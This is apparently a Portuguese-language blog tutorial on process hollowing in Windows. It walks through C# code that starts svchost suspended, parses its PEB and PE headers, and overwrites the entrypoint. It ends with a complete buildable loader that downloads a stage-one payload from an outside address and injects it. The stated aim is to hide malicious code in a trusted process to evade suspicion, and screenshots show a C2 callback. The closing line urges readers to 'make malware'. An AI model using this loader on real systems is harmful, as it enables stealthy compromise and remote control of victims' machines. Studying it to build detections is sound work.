---
layout: post
title: process hollowing
date: 2026-03-26
description: malware windows
categories: malware windows
tags: malware windows
---

* content
{:toc}







# Process Hollowing

Process Hollowing é um tipo de process/code injection usado para ocultar o código malicioso em um processo que aparenta ser benigno, escondendo o processo original que realizou a injeção. Essa tecnica consiste em criar um processo em "suspended state", parsear a memória dele e, em seguida, substituir o entrypoint por um código malicioso. Pesando nisso, ja que a ideia é se passar por um processo legitimo precisamos usar algum que não levante suspeita, se usarmos o notepad por exemplo, é um processo que geralmente não tem trafego de rede saindo por ele, então uma das melhores opções é o svchost.

A seguir vou dividir o código em partes e depois a poc.


## Process Hollowing code

Para começar temos os imports necessarios para usar as funções CreateProcess, ZwQueryInformationProcess, ReadProcessMemory, WriteProcessMemory e ResumeThread. Seguido pelas definições de strucs para tipar as variaveis que vão receber as handles/infos do processo/thread.

- [https://pinvoke.net/default.aspx/kernel32/CreateProcess.html](https://pinvoke.net/default.aspx/kernel32/CreateProcess.html)
- [https://pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html](https://pinvoke.net/default.aspx/ntdll/NtQueryInformationProcess.html) - [https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess](https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess)
- [https://pinvoke.net/default.aspx/kernel32/ReadProcessMemory.html](https://pinvoke.net/default.aspx/kernel32/ReadProcessMemory.html)
- [https://codingvision.net/c-read-write-another-process-memory](https://codingvision.net/c-read-write-another-process-memory)
- [https://pinvoke.net/default.aspx/kernel32/ResumeThread.html](https://pinvoke.net/default.aspx/kernel32/ResumeThread.html)


```cs

[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
          static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
          	IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
          		uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
          			[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

          [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
          private static extern int ZwQueryInformationProcess(IntPtr hProcess,
          	int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
          		uint ProcInfoLen, ref uint retlen);

          [DllImport("kernel32.dll", SetLastError = true)]
          static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
          	[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

           [DllImport("kernel32.dll")]
                  public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
                  	byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

          [DllImport("kernel32.dll", SetLastError = true)]
          private static extern uint ResumeThread(IntPtr hThread);

          [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
          struct STARTUPINFO
          {
               public Int32 cb;
               public string lpReserved;
               public string lpDesktop;
               public string lpTitle;
               public Int32 dwX;
               public Int32 dwY;
               public Int32 dwXSize;
               public Int32 dwYSize;
               public Int32 dwXCountChars;
               public Int32 dwYCountChars;
               public Int32 dwFillAttribute;
               public Int32 dwFlags;
               public Int16 wShowWindow;
               public Int16 cbReserved2;
               public IntPtr lpReserved2;
               public IntPtr hStdInput;
               public IntPtr hStdOutput;
               public IntPtr hStdError;
          }

          [StructLayout(LayoutKind.Sequential)]
          internal struct PROCESS_INFORMATION
          {
          public IntPtr hProcess;
          public IntPtr hThread;
          public int dwProcessId;
          public int dwThreadId;
          }

          [StructLayout(LayoutKind.Sequential)]
          internal struct PROCESS_BASIC_INFORMATION
          {
          public IntPtr Reserved1;
          public IntPtr PebAddress;
          public IntPtr Reserved2;
          public IntPtr Reserved3;
          public IntPtr UniquePid;
          public IntPtr MoreReserved;
          }

          STARTUPINFO si = net STARTUPINFO();
          PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
          PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

```

Chegando na função ```CreateProcess```, o segundo parametro é o path do executavel que queremos iniciar. Pulando para o sexto parametro ```dwCreationFlags``` temos uma parte importante porque ele se refere a forma como o processo será criado, segundo a documentação existem varias flags, mas a que nos interessa é a ```CREATE_SUSPENDED``` ou 0x4 em hexadecimal. O que essa flag faz é simplesmente "The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called.". 

Os dois ultimos parametros são ```lpStartupInfo``` e ```lpProcessInformation``` os outputs da função referente a o processo criado, ja que o return value da função é zero ou nonzero. Essas infos são recebidas pelas variaveis tipadas com as structs ```STARTUPINFO``` e ```PROCESS_INFORMATION``` que guardam proc id, proc handle e etc.

```cs
     static void Main(string[] args){

          STARTUPINFO si = net STARTUPINFO();
          PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
          PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

          bool res = CreateProcess(NULL, "C:\\Windows\\System32\\svchost.exe", IntPrt.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
```

- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa)
- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)


O proximo trecho temos a função ```ZwQueryInformationProcess``` será usada para pegar as ```ProcessInformation```. Primeiro a função recebe o handle do processo extraido usando a ```PROCESS_INFORMATION``` output da função anteriror. O segundo parametro ```ProcessInformationClass``` é onde especificamos qual info extrair do processo alvo, nesse caso o valor 0 ou ```ProcessBasicInformation``` nos permite extrair o ```Process Environment Block aka PEB``` do processo. O terceiro parametro é um output para infos extraidas do processo alvo que são recebidas pela variavel tipada ```PROCESS_BASIC_INFORMATION bi```.

O PEB é uma struct presente em qualquer processo no windows, segundo a doc da microsoft "Contains process information" :(, melhor dizendo, o PEB contem informações ou metadados sobre o processo atual, infos como dll carregadas, env vars, debugging flags e o image base que é o objetivo. O ImageBase um campo do Optional Header que contem o ```preferred address``` do executavel ao ser carregado em memória.

Sabendo disso, com o PEB podemos parsear a memória do processo, ter acesso aos ```PE Headers``` e encontrar o entrypoint para substitui-lo.


```cs
     uint tmp = 0;
     IntPtr hProcess = pi.hProcess;
     ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size* 6), ref tmp);
```

- [https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
- [https://malwaretech.com/wiki/locating-modules-via-the-peb-x64](https://malwaretech.com/wiki/locating-modules-via-the-peb-x64)
- [https://void-stack.github.io/blog/post-Exploring-PEB/](https://void-stack.github.io/blog/post-Exploring-PEB/)
- [https://metehan-bulut.medium.com/understanding-the-process-environment-block-peb-for-malware-analysis-26315453793f](https://metehan-bulut.medium.com/understanding-the-process-environment-block-peb-for-malware-analysis-26315453793f)
- [https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block)


#### PEB + ImageBase + PE Headers parse

Agora é a parte em que parseamos os headers andando pelos offsets para chagarmos até o entrypoint.


1 - Aqui separamos o endereço do PEB armazenado em ```PROCESS_BASIC_INFORMATION bi``` somando mais 0x10 para chagar no offset que esta o pointer ImageBase. ```PEB addr + 0x10 bytes = pointer to ImageBaseAddress```. A imagem a baixo é um exemplo de uma visualização do PEB pelo WinDBG.

```cs
     IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
```


![pebdbg](/img/1_pebdbg.png) ![ibdbg](/img/2_ibdbg.png)


2 - Com a função ```ReadProcessMemory``` ,a partir do pointer para ImageBase, lemos 8 bytes (os 8 bytes que compõem o endereço sendo apontado) e armazena em ```svchostBase```. O terceiro parametro da função é um output para os bytes lidos da memória do processo que será armazanado em ```addrBuf```.

```cs
     byte[] addrBuf = new byte[IntPtr.Size]; //8 bytes
     IntPtr nRead = IntPtr.Zero;
     ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

     IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
```


![rvaibdbg](/img/3_rvaibdbg.png)


- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory)


3 - Tendo o endereço para os Headers do svchost, a partir daí lemos 0x200 bytes da memoria e armazanamos na variavel ```data```.
```cs
     byte[] data = new byte[0x200];
     ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
```

4 - Esses 200 bytes lidos são para alcançar os headers ms-dos, pe e o optional header que contem o EntryPoint. Primeiro somamos ```data``` mais o offset 0x3C que é o campo ```e_lfanew``` (aka pe signature) que marca o final do header ms-dos e o começo do pe header. Depois com o offset do começo do pe header é somado mais 0x28 bytes de offset para chegar até o entrypoint que fica no optional header, basicamente pulando o pe header todo mais alguns bytes do optional header. Em seguida é somado o RVA do entrypoint com o ImageBase do svchost para chegar no endereço base em memoria.

```cs
     uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
     uint opthdr = e_lfanew_offset + 0x28;
     uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
     IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
```


![3cdbg](/img/4_3cdbg.png) ![entrydbg](/img/5_entrydbg.png)


- [https://mentebinaria.gitbook.io/engenharia-reversa/05-o-formato-pe/cabecalhos](https://mentebinaria.gitbook.io/engenharia-reversa/05-o-formato-pe/cabecalhos)
- [https://onlyf8.com/pe-format](https://onlyf8.com/pe-format)
- [https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe](https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe)


#### Sobrescrevendo entrypoint com shellcode

Na ultima parte pegamos o shellcode e salvamos na variavel ```buf```. 

Usando a função ```WriteProcessMemory``` no segundo parametro temos o endereço do entrypoint do svchost e no terceiro parametro o buffer com o shellcode. 

Por ultimo temos a função ```ResumeThread```, seguindo a doc que diz para voltar a execução da thread suspensa basta chamar ResumeThread passando o handle da thread como argumento.


```cs
     WebClient wc = new WebClient();
     byte[] buf = wc.DownloadData("http://192.168.0.1/stage1.bin");

     WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

     ResumeThread(pi.hThread);
}
```


![epaddrdbg](/img/6_epaddrdbg.png)



## POC

Crie e faça build no visual studio

- full source

```cs
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace ProcHoll
{

    class Program()
    {

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
                uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
                    [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
            int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
                uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
                   byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }


        static void Main(string[] args)
        {

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size* 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];

            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            WebClient wc = new WebClient();
            byte[] buf = wc.DownloadData("http://192.168.0.1/stage1.bin");

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```

- run poc


![poc](/img/poc.png)


- c2 callback


![callback](/img/callback.png)


- command exec, medium priv level ...


![getpid](/img/getpid.png)


## Conclusão

Esse foi só mais uma tecnica de process injection de um serie que será postado aqui. Make malware!!